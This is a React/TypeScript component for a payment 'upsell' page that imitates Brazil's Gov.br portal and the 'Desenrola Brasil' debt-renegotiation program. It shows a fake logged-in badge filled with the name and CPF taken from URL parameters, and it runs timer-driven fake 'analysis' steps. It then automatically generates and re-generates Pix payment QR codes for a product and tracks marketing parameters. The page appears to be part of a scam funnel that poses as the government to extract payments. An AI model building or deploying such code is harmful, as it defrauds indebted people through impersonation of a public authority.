import { useServerFn } from "@tanstack/react-start";
import { QRCodeCanvas } from "qrcode.react";
import { useCallback, useEffect, useRef, useState } from "react";

import govLogoSrc from "@/assets/iconegov.png";
const govLogo = { url: govLogoSrc };
import footerLogoSrc from "@/assets/iconefooter.png";
const footerLogo = { url: footerLogoSrc };
import limpeNomeSrc from "@/assets/limpenome.png";
const limpeNome = { url: limpeNomeSrc };
import { checkPixPayment, createPixPayment } from "@/lib/payment.functions";
import type { UpsellConfig } from "@/lib/upsell-config";

const money = (v: number) => v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

function formatCPF(cpf: string) {
  const clean = cpf.replace(/\D/g, "").slice(0, 11);
  if (clean.length !== 11) return cpf;
  return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}




function readParams() {
  const p = new URLSearchParams(window.location.search);
  const name = p.get("name") || "USER345";
  const document = (p.get("document") || "06562983169").replace(/\D/g, "");
  return {
    customer: {
      name,
      document,
      email: p.get("email") || "user@desenrolabrasil.com",
      phone: (p.get("phone") || "11999999999").replace(/\D/g, ""),
    },
    tracking: {
      src: p.get("src"),
      sck: p.get("sck"),
      utm_source: p.get("utm_source"),
      utm_medium: p.get("utm_medium"),
      utm_campaign: p.get("utm_campaign"),
      utm_term: p.get("utm_term"),
      utm_content: p.get("utm_content"),
    },
    search: window.location.search,
  };
}

type Ctx = ReturnType<typeof readParams>;

export type UpsellCopy = {
  headline: React.ReactNode;
  startLabel: string;
  steps: [string, string, string, string];
  offer: React.ReactNode;
  payLabel: string;
  footerNote: React.ReactNode;
};

export function UpsellPage({ config, copy }: { config: UpsellConfig; copy: UpsellCopy }) {
  const [ctx, setCtx] = useState<Ctx | null>(null);
  const [phase, setPhase] = useState<"loading" | "offer">("loading");
  const [step, setStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [pix, setPix] = useState<{ code: string; id: string; createdAt: string } | null>(null);
  const [status, setStatus] = useState<"idle" | "generating" | "pending" | "paid" | "expired" | "error">("idle");
  const [copied, setCopied] = useState(false);
  const [showUser, setShowUser] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const doneRef = useRef(false);

  const createPix = useServerFn(createPixPayment);
  const checkPix = useServerFn(checkPixPayment);

  useEffect(() => {
    setCtx(readParams());
    // Inicia a análise automaticamente, sem botão
    setProgress(40);
    const t1 = setTimeout(() => {
      setProgress(80);
      setStep(1);
    }, 2500);
    const t2 = setTimeout(() => {
      setProgress(100);
      setStep(2);
    }, 5000);
    const t3 = setTimeout(() => {
      setStep(3);
      setPhase("offer");
    }, 7000);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
    };
  }, []);

  const goToNext = useCallback(
    (search: string) => {
      const params = new URLSearchParams(search);
      if (config.nextUrl.startsWith("/")) {
        const qs = params.toString();
        window.location.href = qs ? `${config.nextUrl}?${qs}` : config.nextUrl;
        return;
      }
      const url = new URL(config.nextUrl);
      params.forEach((value, key) => url.searchParams.set(key, value));
      window.location.href = url.toString();
    },
    [config.nextUrl],
  );

  const verify = useCallback(
    async (current: { id: string; createdAt: string }, c: Ctx) => {
      if (doneRef.current) return "paid" as const;
      const result = await checkPix({
        data: {
          upsell: config.id,
          transactionId: current.id,
          createdAt: current.createdAt,
          customer: c.customer,
          tracking: c.tracking,
        },
      });
      if (result.state === "paid") {
        doneRef.current = true;
        if (pollRef.current) clearInterval(pollRef.current);
        setStatus("paid");
        setTimeout(() => goToNext(c.search), 1500);
      } else if (result.state === "expired") {
        if (pollRef.current) clearInterval(pollRef.current);
        setStatus("expired");
      }
      return result.state;
    },
    [checkPix, goToNext, config.id],
  );

  useEffect(() => {
    if (!pix || !ctx || status !== "pending") return;
    pollRef.current = setInterval(() => {
      void verify({ id: pix.id, createdAt: pix.createdAt }, ctx).catch(() => {});
    }, 5000);
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [pix, ctx, status, verify]);

  const handleCheckout = useCallback(async () => {
    if (!ctx || doneRef.current) return;
    setStatus("generating");
    try {
      const result = await createPix({
        data: {
          upsell: config.id,
          customer: ctx.customer,
          tracking: ctx.tracking,
          sourceUrl: window.location.href,
        },
      });
      doneRef.current = false;
      setPix({ id: result.transactionId, code: result.pixCode, createdAt: result.createdAt });
      setStatus("pending");
    } catch (e) {
      console.error(e);
      setStatus("error");
    }
  }, [ctx, createPix, config.id]);

  // Gera o Pix automaticamente quando a oferta aparece; tenta de novo em caso de erro ou expiração
  useEffect(() => {
    if (phase !== "offer" || !ctx || pix) return undefined;
    if (status === "idle") {
      void handleCheckout();
      return undefined;
    }
    if (status === "error") {
      const t = setTimeout(() => void handleCheckout(), 3000);
      return () => clearTimeout(t);
    }
    return undefined;
  }, [phase, ctx, pix, status, handleCheckout]);

  // Se o Pix expirar, gera um novo automaticamente
  useEffect(() => {
    if (status !== "expired") return;
    const t = setTimeout(() => {
      setPix(null);
      setStatus("idle");
    }, 2000);
    return () => clearTimeout(t);
  }, [status]);

  function copyPix() {
    if (!pix) return;
    void navigator.clipboard.writeText(pix.code).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  }

  return (
    <div className="flex min-h-screen flex-col bg-gov-bg font-sans">
      <header className="relative flex items-center justify-center bg-card px-6 py-3 shadow-sm">
        <div className="absolute right-3 top-1/2 -translate-y-1/2">
          <button
            aria-label="Usuário logado"
            onClick={() => setShowUser((v) => !v)}
            className="flex h-9 items-center gap-2 rounded-full bg-gov-blue py-1 pl-1.5 pr-3 transition-opacity hover:opacity-90"
          >
            <span className="flex h-6 w-6 items-center justify-center rounded-full bg-gov-on-blue/20">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-gov-on-blue">
                <circle cx="12" cy="8" r="4" />
                <path d="M4 21c0-4 3.6-6 8-6s8 2 8 6z" />
              </svg>
            </span>
            <span className="text-xs font-bold text-gov-on-blue">
              {ctx?.customer.name ?? "USER345"}
            </span>
          </button>
          {showUser && (
            <>
              <div className="fixed inset-0 z-40" onClick={() => setShowUser(false)} />
              <div className="absolute right-0 top-11 z-50 w-56 rounded-2xl bg-gov-blue p-4 text-gov-on-blue shadow-lg">
                <p className="text-[11px] uppercase tracking-wide opacity-80">Usuário logado</p>
                <p className="mt-1 text-sm font-bold">{ctx?.customer.name ?? "USER345"}</p>
                <p className="mt-0.5 font-mono text-xs opacity-90">
                  {ctx ? formatCPF(ctx.customer.document) : "CPF"}
                </p>
              </div>
            </>
          )}
        </div>
        <img src={govLogo.url} alt="Gov.br" className="h-8 w-auto" />
      </header>

      <main className="flex flex-1 items-center justify-center px-4 py-8">
        <div className="w-full max-w-[560px] rounded-xl bg-card p-6 shadow-lg sm:p-10">
          <div className="mb-6 flex justify-center">
            <img src={limpeNome.url} alt="Limpe seu Nome e Desenrola, Brasil!" className="h-14 w-auto object-contain" />
          </div>

          <h1 className="mb-6 text-center text-sm leading-snug font-medium text-foreground">{copy.headline}</h1>

          {phase === "loading" && (
            <div className="mt-4">
              <div className="mb-6 h-1.5 w-full overflow-hidden rounded-full bg-muted">
                <div
                  className="h-full rounded-full bg-gov-blue transition-all duration-500"
                  style={{ width: `${progress}%` }}
                />
              </div>
              {step === 0 && <Loading text={copy.steps[0]} />}
              {step === 1 && <Loading text={copy.steps[1]} />}
              {step === 2 && <p className="mb-4 text-sm font-bold text-gov-warning">⚠ {copy.steps[2]}</p>}
              {step === 3 && <p className="mb-4 text-sm font-bold text-gov-green">✅ {copy.steps[3]}</p>}
            </div>
          )}

          {phase === "offer" && (
            <div className="mt-6">
              <div className="mb-5 rounded-r-md border-l-4 border-gov-red bg-gov-red-soft p-4">
                <p className="text-sm leading-relaxed text-foreground">{copy.offer}</p>
              </div>

              <p className="mb-4 text-center text-sm text-muted-foreground">
                <b>{config.productName}</b> — <b className="text-gov-green">{money(config.amount)}</b>
              </p>

              {!pix && (
                <div className="flex items-center justify-center gap-3 py-2">
                  <div className="h-5 w-5 shrink-0 animate-spin rounded-full border-2 border-gov-blue border-t-transparent" />
                  <span className="text-sm font-medium text-muted-foreground">Gerando seu Pix...</span>
                </div>
              )}

              {status === "error" && !pix && (
                <p className="mt-3 text-center text-sm font-medium text-gov-red">
                  Falha ao gerar o Pix. Tentando novamente...
                </p>
              )}

              {pix && (
                <div className="mt-6 rounded-lg border border-border bg-gov-bg p-4">
                  <div className="mb-3 flex justify-center">
                    <div className="rounded bg-card p-2">
                      <QRCodeCanvas value={pix.code} size={192} level="H" />
                    </div>
                  </div>
                  <div className="flex items-center justify-between gap-2 rounded border border-border bg-card p-2">
                    <span className="truncate font-mono text-sm text-muted-foreground">{pix.code}</span>
                    <button onClick={copyPix} className="text-sm font-medium text-gov-blue hover:text-gov-dark">
                      {copied ? "Copiado!" : "Copiar"}
                    </button>
                  </div>
                  <p className="mt-2 text-center text-xs text-muted-foreground">
                    Escaneie o QR Code ou copie o código para pagar via Pix
                  </p>

                  {status === "pending" && (
                    <p className="mt-3 text-center text-sm text-gov-warning">
                      Aguardando pagamento... verificando automaticamente.
                    </p>
                  )}

                  {status === "paid" && (
                    <p className="mt-3 text-center text-sm font-bold text-gov-green">
                      ✅ Pagamento confirmado! Redirecionando...
                    </p>
                  )}

                  {status === "expired" && (
                    <p className="mt-3 text-center text-sm font-bold text-gov-red">
                      ⏰ O Pix expirou. Gerando um novo automaticamente...
                    </p>
                  )}
                </div>
              )}
            </div>
          )}

          <div className="mt-8 rounded-r-md border-l-4 border-gov-blue bg-gov-light-blue p-4">
            <p className="text-sm leading-relaxed text-foreground">{copy.footerNote}</p>
          </div>
        </div>
      </main>

      <footer className="border-t-4 border-gov-yellow bg-gov-dark px-4 py-6 text-center text-gov-on-blue">
        <img src={footerLogo.url} alt="Gov.br" className="mx-auto mb-3 h-6 opacity-90" />
        <p className="text-[11px] opacity-70">Sistema de Renegociação — Todos os direitos reservados</p>
      </footer>
    </div>
  );
}

function Loading({ text }: { text: string }) {
  return (
    <div className="mb-4 flex items-center gap-3">
      <div className="h-5 w-5 shrink-0 animate-spin rounded-full border-2 border-gov-blue border-t-transparent" />
      <span className="text-sm text-muted-foreground">{text}</span>
    </div>
  );
}
